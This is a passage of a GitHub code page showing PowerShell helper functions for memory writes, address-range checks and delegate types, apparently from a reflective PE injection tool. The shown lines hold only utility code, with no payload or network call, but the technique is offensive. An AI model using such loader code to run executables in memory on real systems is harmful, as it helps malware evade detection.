          <td id="LC882" class="blob-code blob-code-inner js-file-line">				{</td>
        </tr>
        <tr>
          <td id="L883" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="883"></td>
          <td id="LC883" class="blob-code blob-code-inner js-file-line">					<span class="pl-k">return</span> <span class="pl-c1">$false</span></td>
        </tr>
        <tr>
          <td id="L884" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="884"></td>
          <td id="LC884" class="blob-code blob-code-inner js-file-line">				}</td>
        </tr>
        <tr>
          <td id="L885" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="885"></td>
          <td id="LC885" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L886" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="886"></td>
          <td id="LC886" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L887" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="887"></td>
          <td id="LC887" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L888" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="888"></td>
          <td id="LC888" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L889" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="889"></td>
          <td id="LC889" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Cannot compare byte arrays of different size<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L890" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="890"></td>
          <td id="LC890" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L891" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="891"></td>
          <td id="LC891" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L892" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="892"></td>
          <td id="LC892" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">return</span> <span class="pl-c1">$false</span></td>
        </tr>
        <tr>
          <td id="L893" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="893"></td>
          <td id="LC893" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="L894" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="894"></td>
          <td id="LC894" class="blob-code blob-code-inner js-file-line">	</td>
        </tr>
        <tr>
          <td id="L895" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="895"></td>
          <td id="LC895" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L896" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="896"></td>
          <td id="LC896" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">Function</span> <span class="pl-en">Convert-UIntToInt</span></td>
        </tr>
        <tr>
          <td id="L897" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="897"></td>
          <td id="LC897" class="blob-code blob-code-inner js-file-line">	{</td>
        </tr>
        <tr>
          <td id="L898" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="898"></td>
          <td id="LC898" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">Param</span>(</td>
        </tr>
        <tr>
          <td id="L899" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="899"></td>
          <td id="LC899" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L900" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="900"></td>
          <td id="LC900" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">UInt64</span>]</td>
        </tr>
        <tr>
          <td id="L901" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="901"></td>
          <td id="LC901" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Value</span></td>
        </tr>
        <tr>
          <td id="L902" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="902"></td>
          <td id="LC902" class="blob-code blob-code-inner js-file-line">		)</td>
        </tr>
        <tr>
          <td id="L903" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="903"></td>
          <td id="LC903" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L904" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="904"></td>
          <td id="LC904" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">Byte</span>[]]<span class="pl-smi">$ValueBytes</span> <span class="pl-k">=</span> [<span class="pl-k">BitConverter</span>]::GetBytes(<span class="pl-smi">$Value</span>)</td>
        </tr>
        <tr>
          <td id="L905" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="905"></td>
          <td id="LC905" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">return</span> ([<span class="pl-k">BitConverter</span>]::ToInt64(<span class="pl-smi">$ValueBytes</span><span class="pl-k">,</span> <span class="pl-c1">0</span>))</td>
        </tr>
        <tr>
          <td id="L906" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="906"></td>
          <td id="LC906" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="L907" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="907"></td>
          <td id="LC907" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L908" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="908"></td>
          <td id="LC908" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L909" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="909"></td>
          <td id="LC909" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">Function</span> <span class="pl-en">Get-Hex</span></td>
        </tr>
        <tr>
          <td id="L910" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="910"></td>
          <td id="LC910" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="L911" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="911"></td>
          <td id="LC911" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">Param</span>(</td>
        </tr>
        <tr>
          <td id="L912" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="912"></td>
          <td id="LC912" class="blob-code blob-code-inner js-file-line">        [<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L913" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="913"></td>
          <td id="LC913" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">$Value</span> <span class="pl-c"><span class="pl-c">#</span>We will determine the type dynamically</span></td>
        </tr>
        <tr>
          <td id="L914" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="914"></td>
          <td id="LC914" class="blob-code blob-code-inner js-file-line">        )</td>
        </tr>
        <tr>
          <td id="L915" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="915"></td>
          <td id="LC915" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L916" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="916"></td>
          <td id="LC916" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">$ValueSize</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::SizeOf([<span class="pl-k">Type</span>]<span class="pl-smi">$Value<span class="pl-smi">.GetType</span></span>()) <span class="pl-k">*</span> <span class="pl-c1">2</span></td>
        </tr>
        <tr>
          <td id="L917" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="917"></td>
          <td id="LC917" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">$Hex</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">&quot;</span>0x{0:X<span class="pl-k"><span class="pl-pse">$</span></span><span class="pl-pse">(</span><span class="pl-smi">$ValueSize</span><span class="pl-pse">)</span>}<span class="pl-pds">&quot;</span></span> <span class="pl-k">-f</span> [<span class="pl-k">Int64</span>]<span class="pl-smi">$Value</span> <span class="pl-c"><span class="pl-c">#</span>Passing a IntPtr to this doesn&#39;t work well. Cast to Int64 first.</span></td>
        </tr>
        <tr>
          <td id="L918" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="918"></td>
          <td id="LC918" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L919" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="919"></td>
          <td id="LC919" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> <span class="pl-smi">$Hex</span></td>
        </tr>
        <tr>
          <td id="L920" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="920"></td>
          <td id="LC920" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="L921" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="921"></td>
          <td id="LC921" class="blob-code blob-code-inner js-file-line">	</td>
        </tr>
        <tr>
          <td id="L922" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="922"></td>
          <td id="LC922" class="blob-code blob-code-inner js-file-line">	</td>
        </tr>
        <tr>
          <td id="L923" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="923"></td>
          <td id="LC923" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">Function</span> <span class="pl-en">Test-MemoryRangeValid</span></td>
        </tr>
        <tr>
          <td id="L924" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="924"></td>
          <td id="LC924" class="blob-code blob-code-inner js-file-line">	{</td>
        </tr>
        <tr>
          <td id="L925" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="925"></td>
          <td id="LC925" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">Param</span>(</td>
        </tr>
        <tr>
          <td id="L926" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="926"></td>
          <td id="LC926" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L927" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="927"></td>
          <td id="LC927" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">String</span>]</td>
        </tr>
        <tr>
          <td id="L928" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="928"></td>
          <td id="LC928" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$DebugString</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L929" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="929"></td>
          <td id="LC929" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L930" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="930"></td>
          <td id="LC930" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">1</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L931" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="931"></td>
          <td id="LC931" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Object</span>]</td>
        </tr>
        <tr>
          <td id="L932" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="932"></td>
          <td id="LC932" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PEInfo</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L933" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="933"></td>
          <td id="LC933" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L934" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="934"></td>
          <td id="LC934" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">2</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L935" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="935"></td>
          <td id="LC935" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]</td>
        </tr>
        <tr>
          <td id="L936" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="936"></td>
          <td id="LC936" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$StartAddress</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L937" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="937"></td>
          <td id="LC937" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L938" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="938"></td>
          <td id="LC938" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">ParameterSetName</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">&quot;</span>EndAddress<span class="pl-pds">&quot;</span></span><span class="pl-k">,</span> <span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">3</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L939" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="939"></td>
          <td id="LC939" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]</td>
        </tr>
        <tr>
          <td id="L940" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="940"></td>
          <td id="LC940" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$EndAddress</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L941" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="941"></td>
          <td id="LC941" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L942" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="942"></td>
          <td id="LC942" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">ParameterSetName</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Size<span class="pl-pds">&quot;</span></span><span class="pl-k">,</span> <span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">3</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L943" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="943"></td>
          <td id="LC943" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]</td>
        </tr>
        <tr>
          <td id="L944" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="944"></td>
          <td id="LC944" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Size</span></td>
        </tr>
        <tr>
          <td id="L945" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="945"></td>
          <td id="LC945" class="blob-code blob-code-inner js-file-line">		)</td>
        </tr>
        <tr>
          <td id="L946" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="946"></td>
          <td id="LC946" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L947" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="947"></td>
          <td id="LC947" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$FinalEndAddress</span> <span class="pl-k">=</span> [<span class="pl-k">IntPtr</span>]::Zero</td>
        </tr>
        <tr>
          <td id="L948" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="948"></td>
          <td id="LC948" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-c1">$PsCmdlet<span class="pl-smi">.ParameterSetName</span></span> <span class="pl-k">-eq</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Size<span class="pl-pds">&quot;</span></span>)</td>
        </tr>
        <tr>
          <td id="L949" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="949"></td>
          <td id="LC949" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L950" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="950"></td>
          <td id="LC950" class="blob-code blob-code-inner js-file-line">			[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$FinalEndAddress</span> <span class="pl-k">=</span> [<span class="pl-k">IntPtr</span>](<span class="pl-c1">Add-SignedIntAsUnsigned</span> (<span class="pl-smi">$StartAddress</span>) (<span class="pl-smi">$Size</span>))</td>
        </tr>
        <tr>
          <td id="L951" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="951"></td>
          <td id="LC951" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L952" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="952"></td>
          <td id="LC952" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L953" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="953"></td>
          <td id="LC953" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L954" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="954"></td>
          <td id="LC954" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$FinalEndAddress</span> <span class="pl-k">=</span> <span class="pl-smi">$EndAddress</span></td>
        </tr>
        <tr>
          <td id="L955" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="955"></td>
          <td id="LC955" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L956" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="956"></td>
          <td id="LC956" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L957" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="957"></td>
          <td id="LC957" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PEEndAddress</span> <span class="pl-k">=</span> <span class="pl-smi">$PEInfo<span class="pl-smi">.EndAddress</span></span></td>
        </tr>
        <tr>
          <td id="L958" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="958"></td>
          <td id="LC958" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L959" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="959"></td>
          <td id="LC959" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> ((<span class="pl-c1">Compare-Val1GreaterThanVal2AsUInt</span> (<span class="pl-smi">$PEInfo<span class="pl-smi">.PEHandle</span></span>) (<span class="pl-smi">$StartAddress</span>)) <span class="pl-k">-eq</span> <span class="pl-c1">$true</span>)</td>
        </tr>
        <tr>
          <td id="L960" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="960"></td>
          <td id="LC960" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L961" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="961"></td>
          <td id="LC961" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Trying to write to memory smaller than allocated address range. <span class="pl-smi">$DebugString</span><span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L962" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="962"></td>
          <td id="LC962" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L963" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="963"></td>
          <td id="LC963" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> ((<span class="pl-c1">Compare-Val1GreaterThanVal2AsUInt</span> (<span class="pl-smi">$FinalEndAddress</span>) (<span class="pl-smi">$PEEndAddress</span>)) <span class="pl-k">-eq</span> <span class="pl-c1">$true</span>)</td>
        </tr>
        <tr>
          <td id="L964" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="964"></td>
          <td id="LC964" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L965" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="965"></td>
          <td id="LC965" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Trying to write to memory greater than allocated address range. <span class="pl-smi">$DebugString</span><span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L966" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="966"></td>
          <td id="LC966" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L967" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="967"></td>
          <td id="LC967" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="L968" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="968"></td>
          <td id="LC968" class="blob-code blob-code-inner js-file-line">	</td>
        </tr>
        <tr>
          <td id="L969" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="969"></td>
          <td id="LC969" class="blob-code blob-code-inner js-file-line">	</td>
        </tr>
        <tr>
          <td id="L970" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="970"></td>
          <td id="LC970" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">Function</span> <span class="pl-en">Write-BytesToMemory</span></td>
        </tr>
        <tr>
          <td id="L971" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="971"></td>
          <td id="LC971" class="blob-code blob-code-inner js-file-line">	{</td>
        </tr>
        <tr>
          <td id="L972" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="972"></td>
          <td id="LC972" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">Param</span>(</td>
        </tr>
        <tr>
          <td id="L973" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="973"></td>
          <td id="LC973" class="blob-code blob-code-inner js-file-line">			[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span><span class="pl-k">=</span><span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L974" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="974"></td>
          <td id="LC974" class="blob-code blob-code-inner js-file-line">			[<span class="pl-k">Byte</span>[]]</td>
        </tr>
        <tr>
          <td id="L975" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="975"></td>
          <td id="LC975" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$Bytes</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L976" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="976"></td>
          <td id="LC976" class="blob-code blob-code-inner js-file-line">			</td>
        </tr>
        <tr>
          <td id="L977" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="977"></td>
          <td id="LC977" class="blob-code blob-code-inner js-file-line">			[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span><span class="pl-k">=</span><span class="pl-c1">1</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L978" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="978"></td>
          <td id="LC978" class="blob-code blob-code-inner js-file-line">			[<span class="pl-k">IntPtr</span>]</td>
        </tr>
        <tr>
          <td id="L979" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="979"></td>
          <td id="LC979" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$MemoryAddress</span></td>
        </tr>
        <tr>
          <td id="L980" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="980"></td>
          <td id="LC980" class="blob-code blob-code-inner js-file-line">		)</td>
        </tr>
        <tr>
          <td id="L981" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="981"></td>
          <td id="LC981" class="blob-code blob-code-inner js-file-line">	</td>
        </tr>
        <tr>
          <td id="L982" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="982"></td>
          <td id="LC982" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">for</span> (<span class="pl-smi">$Offset</span> <span class="pl-k">=</span> <span class="pl-c1">0</span>; <span class="pl-smi">$Offset</span> <span class="pl-k">-lt</span> <span class="pl-smi">$Bytes<span class="pl-smi">.Length</span></span>; <span class="pl-smi">$Offset</span><span class="pl-k">++</span>)</td>
        </tr>
        <tr>
          <td id="L983" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="983"></td>
          <td id="LC983" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L984" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="984"></td>
          <td id="LC984" class="blob-code blob-code-inner js-file-line">			[<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::WriteByte(<span class="pl-smi">$MemoryAddress</span><span class="pl-k">,</span> <span class="pl-smi">$Offset</span><span class="pl-k">,</span> <span class="pl-smi">$Bytes</span>[<span class="pl-smi">$Offset</span>])</td>
        </tr>
        <tr>
          <td id="L985" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="985"></td>
          <td id="LC985" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L986" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="986"></td>
          <td id="LC986" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="L987" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="987"></td>
          <td id="LC987" class="blob-code blob-code-inner js-file-line">	</td>
        </tr>
        <tr>
          <td id="L988" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="988"></td>
          <td id="LC988" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L989" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="989"></td>
          <td id="LC989" class="blob-code blob-code-inner js-file-line">	<span class="pl-c"><span class="pl-c">#</span>Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/</span></td>
        </tr>
        <tr>
          <td id="L990" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="990"></td>
          <td id="LC990" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">Function</span> <span class="pl-en">Get-DelegateType</span></td>
        </tr>
        <tr>
          <td id="L991" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="991"></td>
          <td id="LC991" class="blob-code blob-code-inner js-file-line">	{</td>
        </tr>
        <tr>
          <td id="L992" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="992"></td>
          <td id="LC992" class="blob-code blob-code-inner js-file-line">	    <span class="pl-k">Param</span></td>
        </tr>
        <tr>
          <td id="L993" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="993"></td>
          <td id="LC993" class="blob-code blob-code-inner js-file-line">	    (</td>
        </tr>
        <tr>
          <td id="L994" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="994"></td>
          <td id="LC994" class="blob-code blob-code-inner js-file-line">	        [<span class="pl-c1">OutputType</span>([<span class="pl-k">Type</span>])]</td>
        </tr>
        <tr>
          <td id="L995" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="995"></td>
          <td id="LC995" class="blob-code blob-code-inner js-file-line">	        </td>
        </tr>
        <tr>
          <td id="L996" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="996"></td>
          <td id="LC996" class="blob-code blob-code-inner js-file-line">	        [<span class="pl-c1">Parameter</span>( <span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">0</span>)]</td>
        </tr>
        <tr>
          <td id="L997" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="997"></td>
